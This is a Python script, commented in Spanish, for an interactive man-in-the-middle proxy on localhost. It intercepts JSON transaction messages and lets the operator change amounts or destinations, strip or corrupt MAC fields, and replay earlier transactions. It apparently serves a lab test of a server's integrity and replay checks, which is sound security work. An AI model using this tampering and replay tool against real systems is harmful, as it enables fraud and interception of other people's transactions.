#!/usr/bin/env python3
import socket, threading, json, time

LISTEN_HOST, LISTEN_PORT = "127.0.0.1", 9999   # proxy escucha aquí
TARGET_HOST, TARGET_PORT = "127.0.0.1", 8888   # servidor real

last_tx = None  # almacena la última transacción interceptada (para replay)

def handle_client(csock, addr):
    global last_tx
    print(f"🔎 Nueva conexión cliente desde {addr}")
    ssock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ssock.connect((TARGET_HOST, TARGET_PORT))
    except Exception as e:
        print("❌ No se pudo conectar al servidor:", e)
        csock.close(); return

    def c2s():
        global last_tx
        try:
            while True:
                data = csock.recv(8192)
                if not data:
                    break
                text = data.decode(errors="ignore")
                try:
                    msg = json.loads(text)
                except Exception:
                    # no es JSON válido -> reenviar crudo
                    ssock.sendall(data); continue

                if msg.get("type") == "transaction":
                    print("\n=== TX INTERCEPTADA ===")
                    print(json.dumps(msg, indent=2, ensure_ascii=False))
                    print("\nAcciones: [enter]=reenviar intacto | 1=cambiar cantidad | 2=cambiar destino")
                    print("         3=quitar mac | 4=replay último | 5=corromper mac | 6=guardar y reenviar")
                    choice = input("> ").strip()

                    if choice == "1":
                        nueva = input("Nueva cantidad: ").strip()
                        partes = [p.strip() for p in msg["data"].split(",")]
                        if len(partes) == 3:
                            partes[2] = nueva
                            msg["data"] = ",".join(partes)
                            print("➡ cantidad cambiada (mac NO recalculada).")
                    elif choice == "2":
                        nuevo_dest = input("Nuevo destino: ").strip()
                        partes = [p.strip() for p in msg["data"].split(",")]
                        if len(partes) == 3:
                            partes[1] = nuevo_dest
                            msg["data"] = ",".join(partes)
                            print("➡ destino cambiado (mac NO recalculada).")
                    elif choice == "3":
                        msg.pop("mac", None)
                        print("➡ campo mac eliminado.")
                    elif choice == "4":
                        if last_tx:
                            print("➡ Reenviando última TX almacenada (replay).")
                            ssock.sendall(json.dumps(last_tx).encode()); continue
                        else:
                            print("⚠ No hay TX previa; reenviando actual intacta.")
                    elif choice == "5":
                        if "mac" in msg and isinstance(msg["mac"], str) and len(msg["mac"])>0:
                            msg["mac"] = ("0" if msg["mac"][0] != "0" else "1") + msg["mac"][1:]
                            print("➡ mac corrompida.")
                        else:
                            print("⚠ No hay mac para corromper.")
                    elif choice == "6":
                        last_tx = msg
                        ssock.sendall(json.dumps(msg).encode())
                        print("➡ Guardada y reenviada. Volviendo a escuchar.")
                        continue

                    # por defecto: almacenar la tx actual y reenviar
                    last_tx = msg
                    ssock.sendall(json.dumps(msg).encode())

                else:
                    # reenvío simple para otros tipos (login/register/logout)
                    ssock.sendall(data)
        except ConnectionResetError:
            pass
        finally:
            try: ssock.shutdown(socket.SHUT_RDWR)
            except: pass

    def s2c():
        try:
            while True:
                data = ssock.recv(8192)
                if not data:
                    break
                try:
                    parsed = json.loads(data.decode())
                    print("\n<<< RESPUESTA SERVIDOR:")
                    print(json.dumps(parsed, indent=2, ensure_ascii=False))
                except Exception:
                    print("\n<<< RESPUESTA SERVIDOR (raw):", data)
                csock.sendall(data)
        except ConnectionResetError:
            pass
        finally:
            try: csock.shutdown(socket.SHUT_RDWR)
            except: pass

    t1 = threading.Thread(target=c2s, daemon=True)
    t2 = threading.Thread(target=s2c, daemon=True)
    t1.start(); t2.start()
    t1.join(); t2.join()
    csock.close(); ssock.close()
    print(f"🔌 Conexión {addr} cerrada.")

def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((LISTEN_HOST, LISTEN_PORT)); srv.listen(5)
    print(f"🕵️ Proxy MITM interactivo escuchando en {LISTEN_HOST}:{LISTEN_PORT} → {TARGET_HOST}:{TARGET_PORT}")
    try:
        while True:
            c, a = srv.accept()
            threading.Thread(target=handle_client, args=(c,a), daemon=True).start()
    except KeyboardInterrupt:
        print("\n✋ Proxy detenido por teclado.")
    finally:
        srv.close()

if __name__ == "__main__":
    main()
